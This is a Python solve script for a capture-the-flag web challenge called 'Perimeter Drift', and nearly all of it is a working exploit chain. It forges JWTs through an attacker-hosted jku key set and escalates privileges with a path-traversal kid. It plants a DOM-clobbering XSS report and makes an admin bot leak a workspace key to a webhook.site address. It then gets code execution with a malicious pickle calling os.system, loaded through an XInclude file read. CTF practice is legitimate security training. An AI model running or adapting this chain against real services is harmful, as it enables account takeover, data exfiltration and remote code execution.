#!/usr/bin/env python3
"""
Perimeter Drift CTF - Quick Solve
Try ALL approaches in parallel
"""
import base64
import hashlib
import hmac
import json
import os
import pickle
import re
import sys
import time
import urllib.parse

import requests

TARGET = "http://chall.0xfun.org:33382"
WEBHOOK_URL = "https://webhook.site/2e17cadc-41a3-4a6b-805c-aceaef7d539b"
WEBHOOK_UUID = "2e17cadc-41a3-4a6b-805c-aceaef7d539b"
HMAC_KEY = "mysecretkey"


def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_jwt(key, payload, header_extra=None):
    header = {"alg": "RS256", "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    h = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    p = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    si = f"{h}.{p}".encode()
    k = key if isinstance(key, bytes) else key.encode()
    sig = hmac.new(k, si, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


def sso_login(s):
    jwks = json.dumps({"keys": [{"kid": "partner-main", "k": HMAC_KEY}]})
    b64j = base64.b64encode(jwks.encode()).decode()
    jku = f"https://httpbin.org/base64/{urllib.parse.quote(b64j, safe='')}"
    now = int(time.time())
    token = forge_jwt(HMAC_KEY, {
        "sub": "researcher", "email": "nora.vale@drift.com", "name": "Nora Vale",
        "iss": "https://sso.partner.local", "aud": "perimeter-drift-web",
        "exp": now + 3600, "iat": now
    }, {"kid": "partner-main", "jku": jku})
    s.get(f"{TARGET}/sso/callback", params={"id_token": token})
    r = s.get(f"{TARGET}/api/me")
    return r.json()


def escalate_reviewer(s):
    known_key = b"DDDD"
    files = {"file": ("k4.pem", known_key, "application/octet-stream")}
    r = s.post(f"{TARGET}/review/material/upload", files=files)
    fname = r.json().get("filename", "k4.pem")
    kid_name = fname.rsplit(".pem", 1)[0] if fname.endswith(".pem") else fname
    grant = forge_jwt(known_key, {"scope": "report:submit", "iat": int(time.time())},
                      {"kid": f"../review-materials/{kid_name}"})
    s.post(f"{TARGET}/review/escalate", data={"grant": grant})
    return s.get(f"{TARGET}/api/me").json()


def make_pickle():
    class E:
        def __reduce__(self):
            return (os.system, ('cp /flag.txt /shared/loot/flag.txt',))
    return pickle.dumps(E())


def do_rce(wk):
    print(f"  [RCE] Using workspace_key: {wk}")
    b64p = base64.b64encode(make_pickle()).decode()
    files = {"file": ("payload.b64", b64p, "text/plain")}
    r = requests.post(f"{TARGET}/admin/upload", files=files,
                      headers={"X-Workspace-Key": wk})
    print(f"  Upload: {r.status_code} {r.text}")
    xml = ('<doc sink="http://internal:9000/internal/import" '
           'xmlns:drift="http://www.w3.org/2001/XInclude">'
           '<drift:include href="file:///var/app/uploads/payload.b64" parse="text"/></doc>')
    r = requests.post(f"{TARGET}/admin/xml/import", data={"xml": xml},
                      headers={"X-Workspace-Key": wk})
    print(f"  XML import: {r.status_code} {r.text}")
    time.sleep(2)
    r = requests.get(f"{TARGET}/recovery/latest")
    print(f"\n  FLAG: {r.text}")
    return r.text


def solve():
    print(f"Target: {TARGET}")

    # Check flag
    r = requests.get(f"{TARGET}/recovery/latest", timeout=10)
    if "0xfun{" in r.text:
        print(f"FLAG already available: {r.text}")
        return

    # SSO login
    print("[1] SSO JWT Forgery...")
    s = requests.Session()
    me = sso_login(s)
    print(f"    -> {me['username']} ({me['role']})")

    # Escalate
    print("[2] Reviewer escalation...")
    me = escalate_reviewer(s)
    print(f"    -> {me['role']}")

    # Create report with DOM clobbering for XSS chain
    print("[3] Creating DOM clobber report...")
    s2 = requests.Session()
    sso_login(s2)  # fresh researcher session

    # Report body: DOM clobber workspace-state to enable debug mode
    body = '<form id="workspace-state"><input name="state" value=\'{"debug":true,"module":"ops/loader"}\'></form>'
    r = s2.post(f"{TARGET}/reports/new", data={
        "title": "Assessment Report",
        "vuln_type": "XSS",
        "report": body
    })
    rid = "1"
    m = re.search(r'/reports/(\d+)', r.url)
    if m: rid = m.group(1)
    print(f"    Report ID: {rid}")

    # Submit many bot URLs covering all possible TARGET_BASEs
    print("[4] Submitting bot URLs...")
    bases = [
        "http://web:5000",
        "http://host.docker.internal:5000",
        "http://host.docker.internal:33382",
        "http://localhost:5000",
        "http://127.0.0.1:5000",
    ]

    # Test 1: Direct webhook (test internet access)
    r = s.post(f"{TARGET}/report", data={"url": f"{WEBHOOK_URL}/test-internet"})
    print(f"    Direct webhook test: {r.status_code}")

    # Test 2: Admin bounce to webhook
    for b in bases:
        url = f"{b}/admin?bounce=1&cb={WEBHOOK_URL}"
        r = s.post(f"{TARGET}/report", data={"url": url})
        print(f"    Bounce {b}: submitted")

    # Test 3: Admin bounce to same-origin report (with DOM clobber)
    for b in bases:
        report_url = f"{b}/reports/{rid}?view=../../js/admin&bounce=1&cb={WEBHOOK_URL}"
        url = f"{b}/admin?bounce=1&cb={urllib.parse.quote(report_url, safe='')}"
        r = s.post(f"{TARGET}/report", data={"url": url})
        print(f"    Double-bounce {b}: submitted")

    # Poll webhook
    print("\n[5] Polling webhook.site (30s)...")
    wk = None
    for i in range(15):
        time.sleep(2)
        try:
            r = requests.get(f"https://webhook.site/token/{WEBHOOK_UUID}/requests", timeout=10)
            if r.status_code == 200:
                data = r.json()
                if data.get("total", 0) > 0:
                    for req in data.get("data", []):
                        url = req.get("url", "")
                        query = req.get("query", {})
                        print(f"    Request: {url}")
                        if query.get("workspace_key"):
                            wk = query["workspace_key"]
                            break
                        m = re.search(r'workspace_key=([^&]+)', url)
                        if m:
                            wk = urllib.parse.unquote(m.group(1))
                            break
                    if wk:
                        break
                    # If we got requests but no workspace_key, the bot has internet
                    if data.get("total", 0) > 0:
                        print("    Bot has internet but no workspace_key!")
                        for req in data.get("data", []):
                            print(f"      URL: {req.get('url', '')}")
                        break
        except Exception:
            pass
        if i % 5 == 4:
            print(f"    Waiting... ({(i+1)*2}s)")

    if wk:
        print(f"\n[+] workspace_key: {wk}")
        do_rce(wk)
    else:
        print("\n[-] No workspace_key from bot")

    # Final check
    r = requests.get(f"{TARGET}/recovery/latest")
    print(f"\nRecovery: {r.text}")


if __name__ == "__main__":
    solve()
